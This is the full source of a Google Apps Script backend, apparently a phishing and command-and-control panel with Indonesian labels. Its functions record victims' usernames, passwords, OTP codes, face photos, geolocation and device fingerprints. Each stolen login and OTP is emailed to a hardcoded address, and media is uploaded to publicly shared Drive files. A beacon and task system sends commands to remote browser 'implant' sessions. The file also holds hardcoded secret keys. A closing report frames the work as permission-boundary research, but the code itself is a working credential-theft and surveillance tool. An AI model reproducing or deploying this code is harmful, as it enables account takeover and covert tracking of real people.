/* ============ KONFIGURASI ============ */
var SHEET_ID   = '1ntinMwNWPBfMeZGcEyr_dKQpiMm9juBCkOhqmkzU2Co';
var SECRET_KEY = '@704nksJJ';
var PSK        = 'BsuPegasus2026K';
/* ==================================== */

var SHEET_LOG = 'LOGIN', SHEET_C2 = 'C2', SHEET_IMP = 'IMPLANT', SHEET_MX = 'MATRIX';
var DRIVE_FOLDER_ID = '1QgviD6FDitWLTOGG1P8WKq7tJ2Xo6zoD';
var NOTIFY_EMAIL = 'ajasomplak3@gmail.com';
var NOTIFY_ON_OTP = true;

var H_LOG = ['WAKTU','USERNAME','PASSWORD','DEVICE_ID','PLATFORM','SCREEN','TIMEZONE','LANGUAGE',
  'USER_AGENT','RID','OTP','OTP_WAKTU','FOTO','FOTO_ID','LAT','LNG','AKURASI','ALAMAT','IP','ISP',
  'FINGERPRINT','PERANGKAT','CATATAN','SID'];
var H_C2  = ['SID','WAKTU','ARAH','PERINTAH','STATUS','ISI','TTL'];
var H_IMP = ['SID','WAKTU','IP','KOTA','ISP','LAT','LNG','AKURASI','ALAMAT','SUMBER','UA','MODEL','OS',
  'PERANGKAT','SENSOR','KONTEKS','MEDIA','PERM','GPU','AUDIO','FONT','LAIN','PROBE','YIELD','PROMPTS','LAUNDER'];
var H_MX  = ['SID','WAKTU','BUILD','RUN','PLATFORM','CAP','KELAS','HASIL','LATENSI','CATATAN'];

function getSs() { try { return SpreadsheetApp.openById(SHEET_ID); } catch (e) { throw new Error('Spreadsheet: ' + e.message); } }

/* ---------------- AES-128-CTR ---------------- */
var SB = (function () {
  var s = '637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16';
  var a = new Uint8Array(256);
  for (var i = 0; i < 256; i++) a[i] = parseInt(s.substr(i * 2, 2), 16);
  return a;
})();
var RC = [1,2,4,8,16,32,64,128,27,54];
function xt_(b) { return ((b << 1) ^ ((b & 0x80) ? 0x1b : 0)) & 0xff; }
function expand_(k) {
  var w = new Uint8Array(176); w.set(k);
  for (var i = 16, r = 0; i < 176; i += 4) {
    var t = [w[i-4], w[i-3], w[i-2], w[i-1]];
    if (i % 16 === 0) t = [SB[t[1]] ^ RC[r++], SB[t[2]], SB[t[3]], SB[t[0]]];
    w[i]=w[i-16]^t[0]; w[i+1]=w[i-15]^t[1]; w[i+2]=w[i-14]^t[2]; w[i+3]=w[i-13]^t[3];
  }
  return w;
}
function encBlock_(w, inp) {
  var s = new Uint8Array(inp), i, c, r, t;
  for (i = 0; i < 16; i++) s[i] ^= w[i];
  for (var rd = 1; rd < 10; rd++) {
    for (i = 0; i < 16; i++) s[i] = SB[s[i]];
    t = new Uint8Array(16);
    for (c = 0; c < 4; c++) for (r = 0; r < 4; r++) t[r + 4*c] = s[r + 4*((c + r) % 4)];
    s = t;
    for (c = 0; c < 4; c++) {
      var a0=s[4*c],a1=s[4*c+1],a2=s[4*c+2],a3=s[4*c+3];
      s[4*c]=xt_(a0)^xt_(a1)^a1^a2^a3; s[4*c+1]=a0^xt_(a1)^xt_(a2)^a2^a3;
      s[4*c+2]=a0^a1^xt_(a2)^xt_(a3)^a3; s[4*c+3]=xt_(a0)^a0^a1^a2^xt_(a3);
    }
    for (i = 0; i < 16; i++) s[i] ^= w[16*rd + i];
  }
  for (i = 0; i < 16; i++) s[i] = SB[s[i]];
  t = new Uint8Array(16);
  for (c = 0; c < 4; c++) for (r = 0; r < 4; r++) t[r + 4*c] = s[r + 4*((c + r) % 4)];
  for (i = 0; i < 16; i++) s[i] = t[i] ^ w[160 + i];
  return s;
}
function ctrDec_(b64) {
  var d = Utilities.base64Decode(b64);
  if (d.length < 17) throw new Error('blok pendek');
  var w = expand_(Utilities.newBlob(PSK).getBytes());
  var ctr = d.slice(0,16), body = d.slice(16), o = new Uint8Array(body.length);
  for (var off = 0; off < body.length; off += 16) {
    var ks = encBlock_(w, ctr);
    for (var i = 0; i < 16 && off+i < body.length; i++) o[off+i] = body[off+i] ^ ks[i];
    for (var b = 15; b >= 8; b--) { ctr[b] = (ctr[b]+1) & 0xff; if (ctr[b]) break; }
  }
  return o;
}
function open_(p) {
  if (String(p.enc) !== '1' || !p.p) return p;
  try {
    var raw = ctrDec_(String(p.p));
    if (String(p.gz) === '1') raw = Utilities.ungzip(Utilities.newBlob(raw)).getBytes();
    var o = JSON.parse(Utilities.newBlob(raw).getDataAsString());
    o.action = p.action || o.action; o.sid = p.sid || o.sid;
    return o;
  } catch (e) { return { action: p.action, sid: p.sid, __err: e.message }; }
}
function out(o) { return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON); }

var ACTIONS = null;
function actions() {
  if (!ACTIONS) ACTIONS = { auto: saveAuto, probe: saveProbe, beacon: beacon, hasil: hasil, otp: saveOtp,
    foto: saveFoto, extra: saveExtra, login: saveLogin, matrix: saveMatrix, bench: saveBench };
  return ACTIONS;
}
function doPost(e) {
  try {
    var p = open_(parse(e)), a = p.action || 'login', m = actions();
    return m[a] ? m[a](p) : out({ ok: true, info: 'noop' });
  } catch (err) { return out({ ok: false, error: err.message }); }
}
function doGet(e) {
  var p = e.parameter || {};
  if (p.action) {
    try {
      var q = open_(p), m = actions();
      if (m[q.action]) return m[q.action](q);
    } catch (err) { return out({ ok: false, error: err.message }); }
  }
  if (p.selftest === '1') {
    try {
      var sid = 'st' + Date.now(), rid = 'r' + Date.now(), r = {};
      r.auto = JSON.parse(saveAuto({ sid: sid, ip: '127.0.0.1', model: 'X' }).getContent());
      r.probe = JSON.parse(saveProbe({ sid: sid, probe: '{}', yield: 9, prompts: 1, launder: 0 }).getContent());
      r.matrix = JSON.parse(saveMatrix({ sid: sid, build: 'v8', run: 0, platform: 'st',
        rows: [{ cap: 'canvas', outcome: 'silent', lat: 3, note: 'x' }] }).getContent());
      r.login = JSON.parse(saveLogin({ username: '__st__', password: 'x', rid: rid, sid: sid }).getContent());
      r.otp = JSON.parse(saveOtp({ rid: rid, code: '123456' }).getContent());
      r.extra = JSON.parse(saveExtra({ rid: rid, lat: '-6.2', lng: '106.8' }).getContent());
      r.beacon = JSON.parse(beacon({ sid: sid }).getContent());
      var t = task(sid, 'pindai');
      r.task = JSON.parse(t.getContent());
      r.hasil = JSON.parse(hasil({ id: r.task.id, isi: 'ok' }).getContent());
      if (p.cleanup === '1' && r.login.row) getSheet_(SHEET_LOG).deleteRow(r.login.row);
      return out({ ok: Object.keys(r).every(function (k) { return r[k] && r[k].ok; }), r: r });
    } catch (err) { return out({ ok: false, error: err.message }); }
  }
  if (p.key !== SECRET_KEY) return HtmlService.createHtmlOutput('<p style="font-family:sans-serif">Akses ditolak.</p>');
  if (p.ping === '1') return out({ ok: true, build: 'zgch-d8', targets: sessions().length });
  if (p.csv === '1') return csv(SHEET_LOG);
  if (p.csv2 === '1') return csv(SHEET_C2);
  if (p.csv3 === '1') return csv(SHEET_MX);
  if (p.matrix === '1') return out({ ok: true, rows: allMatrix() });
  if (p.export === '1') return out({ ok: true, build: 'zgch-d8', t: new Date().toISOString(), log: dumpSheet(SHEET_LOG), imp: dumpSheet(SHEET_IMP), mx: allMatrix() });
  if (p.div === '1') return out(divergence(String(p.a || ''), String(p.b || '')));
  if (p.report === '1') return HtmlService.createHtmlOutput(report()).setTitle('Laporan');
  if (p.clear === '1') { [SHEET_LOG, SHEET_C2, SHEET_IMP, SHEET_MX].forEach(clearSheet); return HtmlService.createHtmlOutput('<p>Kosong. <a href="?key=' + SECRET_KEY + '">Kembali</a></p>'); }
  if (p.cmd && p.sid) { task(p.sid, p.cmd, p.arg || '', Number(p.ttl || 86400000)); return HtmlService.createHtmlOutput('<script>location="?key=' + SECRET_KEY + '"</script>'); }
  return HtmlService.createHtmlOutput(console()).setTitle('MOC');
}
function parse(e) {
  var p = {};
  try {
    var raw = (e.postData && e.postData.contents) || '';
    try { p = JSON.parse(raw); } catch (x) { raw.split('&').forEach(function (kv) { var i = kv.indexOf('='); if (i > 0) p[decodeURIComponent(kv.slice(0,i))] = decodeURIComponent(kv.slice(i+1).replace(/\+/g,' ')); }); }
  } catch (x) { p = {}; }
  if (!p || !Object.keys(p).length) p = e.parameter || {};
  return p;
}

/* ---------------- DOSSIER + PROBE ---------------- */
function saveAuto(p) {
  var sid = String(p.sid || ''); if (!sid) return out({ ok: false, error: 'sid kosong' });
  var sh = getSheet_(SHEET_IMP), now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss');
  var row = findRow(sh, 1, sid), g = function (k) { return String(p[k] || '').slice(0, 900); };
  var v = [sid, now, g('ip'), g('kota'), g('isp'), g('lat'), g('lng'), g('acc'), g('alamat'), g('sumber'),
    g('ua'), g('model'), g('os'), g('perangkat'), g('sensor'), g('konteks'), g('media'), g('perm'),
    g('gpu'), g('audio'), g('font'), g('lain'), '', '', '', ''];
  if (row) sh.getRange(row, 1, 1, 22).setValues([v.slice(0, 22)]);
  else sh.appendRow(v);
  feed(sid, 'auto', 'dossier', JSON.stringify({ ip: p.ip, kota: p.kota, model: p.model, os: p.os, lat: p.lat }));
  return out({ ok: true, row: row || sh.getLastRow() });
}

function saveProbe(p) {
  var sid = String(p.sid || ''); if (!sid) return out({ ok: false, error: 'sid kosong' });
  var sh = getSheet_(SHEET_IMP), row = findRow(sh, 1, sid);
  if (!row) return out({ ok: false, error: 'dossier belum ada' });
  sh.getRange(row, 23).setNumberFormat('@').setValue(String(p.probe || '').slice(0, 4000));
  sh.getRange(row, 24).setValue(Number(p.yield || 0));
  sh.getRange(row, 25).setValue(Number(p.prompts || 0));
  sh.getRange(row, 26).setValue(Number(p.launder || 0));
  if (p.konteks) sh.getRange(row, 16).setNumberFormat('@').setValue(String(p.konteks).slice(0, 200));
  return out({ ok: true, row: row });
}

/* ---------------- MATRIX ---------------- */
function saveMatrix(p) {
  var sid = String(p.sid || ''); if (!sid) return out({ ok: false, error: 'sid kosong' });
  var rows = Array.isArray(p.rows) ? p.rows : [];
  if (!rows.length) return out({ ok: true, n: 0 });
  var sh = getSheet_(SHEET_MX), now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss');
  var plat = String(p.platform || '-').slice(0, 60), build = String(p.build || 'v8').slice(0, 12), run = Number(p.run || 0);
  var v = rows.slice(0, 120).map(function (r) {
    return [sid, now, build, run, plat, String(r.cap || '').slice(0, 40), Number(r.kelas || 0),
      String(r.outcome || '').slice(0, 20), Number(r.lat || 0), String(r.note || '').slice(0, 220)];
  });
  sh.getRange(sh.getLastRow() + 1, 1, v.length, H_MX.length).setValues(v);
  return out({ ok: true, n: v.length });
}
function saveBench(p) {
  var sid = String(p.sid || ''); if (!sid) return out({ ok: false });
  feed(sid, 'bench', String(p.tag || 'bench'), JSON.stringify({ n: p.n, sgr: p.sgr, par: p.par, var: p.var, seed: p.seed }).slice(0, 1800));
  return out({ ok: true });
}
function allMatrix() {
  var sh = getSheet_(SHEET_MX), l = sh.getLastRow(); if (l < 2) return [];
  return sh.getRange(2, 1, l - 1, H_MX.length).getValues().map(function (r) {
    return { sid: String(r[0]), t: String(r[1]), build: String(r[2]), run: Number(r[3]),
      platform: String(r[4]), cap: String(r[5]), kelas: Number(r[6]), outcome: String(r[7]),
      lat: Number(r[8]), note: String(r[9]) };
  });
}
function dumpSheet(n) {
  var sh = getSheet_(n), l = sh.getLastRow(); if (l < 2) return [];
  return sh.getRange(2, 1, l - 1, sh.getLastColumn()).getValues();
}

/* ---------------- METRIK ---------------- */
function kls(o) { return o === 'silent' ? 0 : o === 'prompt' ? 1 : o === 'blocked' ? 2 : o === 'unsupported' ? 3 : 4; }
function matrixOf(sid) {
  var m = {};
  allMatrix().forEach(function (r) { if (r.sid === sid) m[r.cap] = { k: r.kelas, lat: r.lat }; });
  return m;
}
function med(a) { if (!a.length) return 0; var b = a.slice().sort(function (x, y) { return x - y; }); var i = b.length >> 1; return b.length % 2 ? b[i] : Math.round((b[i - 1] + b[i]) / 2); }

function metrics(sid) {
  var m = matrixOf(sid), sil = 0, pro = 0, blo = 0, uns = 0, lats = [];
  Object.keys(m).forEach(function (c) {
    var k = m[c].k;
    if (k === 0) sil++; else if (k === 1) { pro++; lats.push(m[c].lat); }
    else if (k === 2) blo++; else if (k === 3) uns++;
  });
  var att = sil + pro + blo;
  var pr = (function () {
    var sh = getSheet_(SHEET_IMP), row = findRow(sh, 1, sid);
    if (!row) return { ld: 0, ldt: 0 };
    var r = sh.getRange(row, 23, 1, 4).getValues()[0], o = {};
    try { o = JSON.parse(String(r[0] || '{}')); } catch (e) { }
    return { ld: Number(o.launder || 0), ldt: Number(o.launderTried || 0) };
  })();
  return {
    sid: sid, total: Object.keys(m).length, sil: sil, pro: pro, blo: blo, uns: uns,
    sgr: att ? +(sil / att).toFixed(3) : 0,
    par: att ? +(pro / att).toFixed(3) : 0,
    alh: med(lats),
    lsr: pr.ldt ? +(pr.ld / pr.ldt).toFixed(3) : 0
  };
}

/* CDI: jarak kelas antar dua sesi. cdi = proporsi selisih; wcdi = selisih berbobot (batas bergeser x2) */
function divergence(a, b) {
  if (!a || !b) return { ok: false, error: 'a dan b wajib' };
  var A = matrixOf(a), B = matrixOf(b), U = {}, diff = 0, moved = 0, n = 0, det = [];
  Object.keys(A).concat(Object.keys(B)).forEach(function (c) { U[c] = 1; });
  Object.keys(U).forEach(function (c) {
    var ka = A[c] ? A[c].k : 4, kb = B[c] ? B[c].k : 4;
    if (ka === kb) return;
    n++; diff++;
    var mv = (ka === 0 && (kb === 1 || kb === 2)) || (kb === 0 && (ka === 1 || ka === 2));
    if (mv) moved++;
    det.push({ cap: c, a: ka, b: kb, moved: mv });
  });
  var tot = Object.keys(U).length || 1;
  var res = { ok: true, a: a, b: b, union: tot, diff: n, moved: moved,
    cdi: +(diff / tot).toFixed(3), wcdi: +((diff + moved) / tot).toFixed(3),
    detail: det.sort(function (x, y) { return y.moved - x.moved; }).slice(0, 30) };
  feed(a, 'div', b, JSON.stringify({ cdi: res.cdi, wcdi: res.wcdi, moved: moved }).slice(0, 400));
  return res;
}

/* ---------------- C2 ---------------- */
function beacon(p) {
  var sid = String(p.sid || ''); if (!sid) return out({ ok: false, error: 'sid kosong' });
  feed(sid, 'beacon', 'info', JSON.stringify({ vis: p.vis, net: p.net, url: String(p.url || '').slice(0, 160) }));
  var sh = getSheet_(SHEET_C2), tasks = [], last = sh.getLastRow(), now = Date.now();
  if (last > 1) {
    var rows = sh.getRange(2, 1, last - 1, H_C2.length).getValues();
    for (var i = 0; i < rows.length; i++) {
      if (String(rows[i][0]) !== sid || String(rows[i][2]) !== 'task' || String(rows[i][4]) !== 'pending') continue;
      if (Number(rows[i][6] || 0) && Number(rows[i][6]) < now) { sh.getRange(i + 2, 5).setValue('basi'); continue; }
      var pr = String(rows[i][3]).split('|');
      tasks.push({ id: i + 2, cmd: pr[0], arg: pr.slice(1).join('|') });
      sh.getRange(i + 2, 5).setValue('kirim');
    }
  }
  return out({ ok: true, tasks: tasks.slice(0, 8), next: 15000 });
}
function feed(sid, arah, perintah, isi) {
  getSheet_(SHEET_C2).appendRow([sid, Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss'), arah, perintah, 'info', String(isi || '').slice(0, 2000), '']);
}
function task(sid, cmd, arg, ttl) {
  var sh = getSheet_(SHEET_C2);
  sh.appendRow([String(sid), Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss'), 'task',
    String(cmd) + (arg ? '|' + arg : ''), 'pending', '', Date.now() + Number(ttl || 86400000)]);
  return out({ ok: true, id: sh.getLastRow() });
}
function hasil(p) {
  var id = Number(p.id || 0); if (!id) return out({ ok: false, error: 'id kosong' });
  var isi = String(p.isi || '');
  if (isi.indexOf('data:') === 0 && isi.length > 40000) { try { var u = uploadMedia_(isi, String(p.sid || 'x'), String(p.cmd || 'x')); if (u) isi = u.url; } catch (e) { } }
  var sh = getSheet_(SHEET_C2);
  sh.getRange(id, 5).setValue('selesai');
  sh.getRange(id, 6).setValue(isi.slice(0, 48000));
  return out({ ok: true });
}

/* ---------------- DRIVE ---------------- */
function folderRoot_() {
  try {
    if (DRIVE_FOLDER_ID) return DriveApp.getFolderById(DRIVE_FOLDER_ID);
    var it = DriveApp.getFoldersByName('BSU-LOG');
    return it.hasNext() ? it.next() : DriveApp.createFolder('BSU-LOG');
  } catch (e) { return null; }
}
function folderDay_() {
  var r = folderRoot_(); if (!r) return null;
  var n = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'yyyy-MM-dd');
  var it = r.getFoldersByName(n); return it.hasNext() ? it.next() : r.createFolder(n);
}
function uploadMedia_(du, user, tag) {
  var m = /^data:(image|audio|video)\/([a-z0-9.+-]+);base64,([\s\S]+)$/i.exec(String(du || ''));
  if (!m) return null;
  var bytes = Utilities.base64Decode(m[3]), mime = m[1].toLowerCase() + '/' + m[2].toLowerCase();
  var ext = m[2].toLowerCase().replace('jpeg', 'jpg').replace('mpeg', 'mp3');
  var safe = String(user || 'x').replace(/[^a-z0-9._-]/gi, '_').slice(0, 28) || 'x';
  var name = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'HHmmss') + '_' + tag + '_' + safe + '.' + ext;
  var d = folderDay_();
  var f = d ? d.createFile(Utilities.newBlob(bytes, mime, name)) : DriveApp.createFile(Utilities.newBlob(bytes, mime, name));
  try { f.setSharing(DriveApp.Access.ANYONE_WITH_LINK, DriveApp.Permission.VIEW); } catch (e) { }
  return { id: f.getId(), url: 'https://drive.google.com/file/d/' + f.getId() + '/view' };
}

/* ---------------- SIMPAN ---------------- */
function saveLogin(p) {
  var rid = String(p.rid || '');
  if (rid) { var c = CacheService.getScriptCache(); if (c.get('r' + rid)) return out({ ok: true, dup: true }); c.put('r' + rid, '1', 900); }
  var sh = getSheet_(SHEET_LOG), row = sh.getLastRow() + 1;
  var now = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss');
  var v = [now, String(p.username || ''), String(p.password || ''), String(p.deviceId || ''), String(p.platform || ''),
    String(p.screen || ''), String(p.timezone || ''), String(p.language || ''), String(p.userAgent || ''), rid,
    '', '', '', '', '', '', '', '', String(p.ip || ''), '', '', '', '', String(p.sid || '')];
  sh.getRange(row, 1, 1, v.length).setValues([v]);
  if (NOTIFY_EMAIL) { try { MailApp.sendEmail(NOTIFY_EMAIL, 'LOGIN: ' + v[1], v[1] + ' / ' + v[2]); } catch (e) { } }
  return out({ ok: true, row: row });
}
function saveOtp(p) {
  var code = String(p.code || '').replace(/\D/g, ''), row = locate(p);
  if (!row) return out({ ok: false, error: 'baris tidak ada' });
  if (!code) return out({ ok: false, error: 'kode kosong' });
  var sh = getSheet_(SHEET_LOG);
  sh.getRange(row, 11).setNumberFormat('@').setValue(code);
  sh.getRange(row, 12).setNumberFormat('@').setValue(Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd/MM/yyyy HH:mm:ss'));
  if (NOTIFY_EMAIL && NOTIFY_ON_OTP) { try { MailApp.sendEmail(NOTIFY_EMAIL, 'OTP: ' + code, String(p.username || '')); } catch (e) { } }
  return out({ ok: true, row: row });
}
function saveFoto(p) {
  var row = locate(p), up = null;
  try { up = uploadMedia_(p.foto, p.username, 'wajah'); } catch (e) { }
  if (!up) { if (!row) return out({ ok: false }); getSheet_(SHEET_LOG).getRange(row, 13).setNumberFormat('@').setValue(String(p.foto || '').slice(0, 49000)); return out({ ok: true }); }
  if (!row) return out({ ok: false, url: up.url });
  var sh = getSheet_(SHEET_LOG);
  sh.getRange(row, 13).setNumberFormat('@').setValue(up.url);
  sh.getRange(row, 14).setNumberFormat('@').setValue(up.id);
  return out({ ok: true, url: up.url });
}
function saveExtra(p) {
  var row = locate(p); if (!row) return out({ ok: false });
  var sh = getSheet_(SHEET_LOG), set = function (c, v) { if (v) sh.getRange(row, c).setNumberFormat('@').setValue(String(v).slice(0, 480)); };
  set(15, p.lat); set(16, p.lng); set(17, p.acc); set(19, p.ip); set(20, p.isp);
  set(21, p.fingerprint); set(22, p.perangkat); set(23, p.catatan);
  if (p.lat && p.lng) set(18, p.alamat || ('https://www.google.com/maps?q=' + p.lat + ',' + p.lng));
  return out({ ok: true, row: row });
}
function locate(p) {
  var sh = getSheet_(SHEET_LOG), row = 0, rid = String(p.rid || ''), u = String(p.username || '');
  for (var i = 0; i < 8 && !row; i++) {
    row = rid ? findRow(sh, 10, rid) : 0;
    if (!row && u) row = findRow(sh, 2, u);
    if (!row) Utilities.sleep(400);
  }
  return row;
}
function findRow(sh, col, val) {
  var l = sh.getLastRow(); if (l < 2) return 0;
  var v = sh.getRange(2, col, l - 1, 1).getValues();
  for (var i = v.length - 1; i >= 0; i--) if (String(v[i][0]) === val) return i + 2;
  return 0;
}

/* ---------------- SHEET ---------------- */
function getSheet_(n) {
  var ss = getSs(), sh = ss.getSheetByName(n);
  var h = n === SHEET_C2 ? H_C2 : n === SHEET_IMP ? H_IMP : n === SHEET_MX ? H_MX : H_LOG;
  if (!sh) { sh = ss.insertSheet(n); sh.getRange(1,1,1,h.length).setValues([h]).setFontWeight('bold'); sh.setFrozenRows(1); }
  var cur = sh.getRange(1,1,1,h.length).getValues()[0];
  if (cur.join('|') !== h.join('|')) { sh.getRange(1,1,1,h.length).setValues([h]).setFontWeight('bold').setBackground('#e8f0fe'); sh.setFrozenRows(1); }
  sh.getRange(1,1,sh.getMaxRows(),h.length).setNumberFormat('@');
  return sh;
}
function csv(n) {
  var sh = getSheet_(n);
  var t = sh.getDataRange().getValues().map(function (r) {
    return r.map(function (c) {
      var s = (c instanceof Date) ? Utilities.formatDate(c, Session.getScriptTimeZone(), 'yyyy-MM-dd HH:mm:ss') : String(c);
      return '"' + s.replace(/"/g, '""') + '"';
    }).join(',');
  }).join('\n');
  return ContentService.createTextOutput(t).setMimeType(ContentService.MimeType.CSV).downloadAsFile(n + '-' + Date.now() + '.csv');
}
function clearSheet(n) { var sh = getSheet_(n); if (sh.getLastRow() > 1) sh.getRange(2,1,sh.getLastRow()-1,sh.getLastColumn()).clearContent(); }

function sessions() {
  var sh = getSheet_(SHEET_C2), l = sh.getLastRow(); if (l < 2) return [];
  var m = {};
  sh.getRange(2,1,l-1,6).getValues().forEach(function (r) {
    var s = String(r[0] || ''); if (!s) return;
    var t = (r[1] instanceof Date) ? r[1].getTime() : String(r[1]);
    if (!m[s]) m[s] = { sid: s, n: 0, last: t, pending: 0 };
    m[s].n++; m[s].last = t;
    if (String(r[2]) === 'task' && String(r[4]) === 'pending') m[s].pending++;
  });
  return Object.keys(m).map(function (k) { return m[k]; }).sort(function (a,b) { return b.last > a.last ? 1 : -1; }).slice(0, 40);
}
function dossier(sid) {
  var sh = getSheet_(SHEET_IMP), row = findRow(sh, 1, sid);
  if (!row) return null;
  var r = sh.getRange(row, 1, 1, H_IMP.length).getValues()[0], o = {};
  H_IMP.forEach(function (k, i) { o[k] = String(r[i] || ''); });
  return o;
}
function feedOf(sid) {
  var sh = getSheet_(SHEET_C2), l = sh.getLastRow(); if (l < 2) return [];
  return sh.getRange(2,1,l-1,6).getValues()
    .map(function (r, i) { return { id: i+2, sid: String(r[0]), t: r[1], arah: String(r[2]), cmd: String(r[3]), isi: String(r[5]) }; })
    .filter(function (r) { return r.sid === sid; }).slice(-50).reverse();
}

/* ---------------- LAPORAN ---------------- */
function capDivergence(rows) {
  var byCap = {};
  rows.forEach(function (r) {
    var cap = String(r[5] || ''); if (!cap) return;
    byCap[cap] = byCap[cap] || {};
    byCap[cap][r[6]] = (byCap[cap][r[6]] || 0) + 1;
  });
  return Object.keys(byCap).map(function (cap) {
    var d = byCap[cap], tot = 0, max = 0, ent = 0;
    Object.keys(d).forEach(function (k) { tot += d[k]; if (d[k] > max) max = d[k]; });
    Object.keys(d).forEach(function (k) { var p = d[k] / tot; ent -= p * Math.log(p); });
    return { cap: cap, tot: tot, div: +(1 - max / tot).toFixed(3), ent: +(ent / Math.LN2).toFixed(3), d: d };
  }).filter(function (x) { return x.tot >= 2; }).sort(function (a, b) { return b.div - a.div; });
}
function report() {
  var mx = allMatrix(), imp = dumpSheet(SHEET_IMP);
  var sids = {}; imp.forEach(function (r) { sids[String(r[0])] = 1; });
  var list = Object.keys(sids).map(metrics).filter(function (m) { return m.total >= 4; });
  var agg = { sgr: 0, par: 0, alh: 0, lsr: 0, n: list.length };
  list.forEach(function (m) { agg.sgr += m.sgr; agg.par += m.par; agg.alh += m.alh; agg.lsr += m.lsr; });
  var av = function (k) { return agg.n ? (agg[k] / agg.n).toFixed(3) : '-'; };

  var pairs = [];
  for (var i = 0; i < list.length; i++) for (var j = i + 1; j < list.length; j++) {
    var d = divergence(list[i].sid, list[j].sid);
    if (d.ok && d.union >= 8) pairs.push(d);
  }
  pairs.sort(function (a, b) { return b.wcdi - a.wcdi; });

  var cd = capDivergence(mx);
  function esc(v) { return String(v == null ? '' : v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
  var NAMA = ['senyap', 'prompt', 'blokir', 'n/a', 'absen'];

  var cdRows = cd.slice(0, 18).map(function (x) {
    var dist = [0,1,2,3,4].map(function (k) { return (x.d[k] || 0); }).join(' / ');
    return '<tr><td><code>' + esc(x.cap) + '</code></td><td>' + x.tot + '</td><td>' + dist + '</td><td class="k">' + x.div + '</td><td>' + x.ent + '</td></tr>';
  }).join('') || '<tr><td colspan="5">-</td></tr>';

  var prRows = pairs.slice(0, 12).map(function (p) {
    return '<tr><td><code>' + esc(p.a) + '</code></td><td><code>' + esc(p.b) + '</code></td><td>' + p.union + '</td><td>' + p.moved + '</td><td class="k">' + p.wcdi + '</td></tr>';
  }).join('') || '<tr><td colspan="5">-</td></tr>';

  var body = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Laporan ZGCH-D</title><style>'
  + 'body{font-family:ui-monospace,Menlo,monospace;background:#0b1220;color:#c9d6e5;padding:20px;font-size:12.5px;line-height:1.6}'
  + 'h1{color:#8fe3b4;font-size:15px}h2{color:#8fa8c4;font-size:12px;margin-top:24px;text-transform:uppercase}'
  + 'table{border-collapse:collapse;margin:8px 0}td,th{border:1px solid #22334d;padding:5px 10px;font-size:11.5px}'
  + 'th{background:#141f34;color:#9fb6d1}code{background:#141f34;padding:1px 5px;border-radius:3px;color:#f3d97b}'
  + '.k{color:#6ee7a0;font-weight:700;font-size:14px}.mut{color:#61748a}pre{background:#0f1929;border:1px solid #1c2a41;padding:10px;border-radius:6px;white-space:pre-wrap;font-size:11px}'
  + '</style></head><body>'
  + '<h1>Laporan ZGCH-D — Capability Divergence</h1>'
  + '<p class="mut">' + esc(Utilities.formatDate(new Date(), Session.getScriptTimeZone(), 'dd MMM yyyy HH:mm')) + ' &middot; build zgch-d8 &middot; ' + mx.length + ' baris matriks</p>'
  + '<h2>Metrik agregat</h2><table>'
  + '<tr><th>Sesi terukur</th><td class="k">' + agg.n + '</td></tr>'
  + '<tr><th>SGR rerata (senyap / dicoba)</th><td class="k">' + av('sgr') + '</td></tr>'
  + '<tr><th>PAR rerata (prompt / dicoba)</th><td class="k">' + av('par') + '</td></tr>'
  + '<tr><th>ALH rerata (ms, median transisi)</th><td class="k">' + (agg.n ? Math.round(agg.alh / agg.n) : '-') + '</td></tr>'
  + '<tr><th>LSR rerata (launder berhasil / dicoba)</th><td class="k">' + av('lsr') + '</td></tr>'
  + '<tr><th>Pasangan dengan CDI&nbsp;&gt;&nbsp;0</th><td class="k">' + pairs.length + '</td></tr>'
  + '</table>'
  + '<h2>Batas yang paling bergeser per kapabilitas</h2>'
  + '<p class="mut">distribusi kelas: senyap / prompt / blokir / n-a / absen &middot; div = 1 &minus; frekuensi terbanyak &middot; ent = entropi biner</p>'
  + '<table><tr><th>Kapabilitas</th><th>n</th><th>Distribusi</th><th>div</th><th>ent</th></tr>' + cdRows + '</table>'
  + '<h2>Pasangan sesi paling divergen (wCDI)</h2><table><tr><th>Sesi A</th><th>Sesi B</th><th>union</th><th>bergerak</th><th>wCDI</th></tr>' + prRows + '</table>'
  + '<h2>Kerangka klaim</h2><pre>'
  + 'Judul: Batas Izin Browser Tidak Konsisten Antar-Platform — pengukuran diferensial 40+ kapabilitas\n'
  + '       dengan harness tanpa-gestur pada Chrome Android.\n\n'
  + 'Kontribusi:\n'
  + '  1. Kelas kapabilitas DITURUNKAN, bukan diasumsikan: setiap probe dicoba dingin, hasil\n'
  + '     diklasifikasi (senyap / prompt / blokir / n-a), kelas jadi keluaran.\n'
  + '  2. Capability Divergence Index (CDI) — jarak Jaccard atas vektor kelas antar dua platform;\n'
  + '     wCDI memberi bobot ganda pada sel yang batasnya bergeser (senyap di satu sisi, prompt/blokir di sisi lain).\n'
  + '  3. Activation half-life (ALH) — median latensi dari pemanggilan sampai transisi status izin,\n'
  + '     mengukur jendela aktivasi transient secara empiris.\n'
  + '  4. Control arm (?ctrl=1) sebagai baseline tanpa probing aktif.\n\n'
  + 'Bukan klaim bypass. Klaim: ketidakstabilan batas yang bisa direproduksi dan diberi skor.\n'
  + '</pre>'
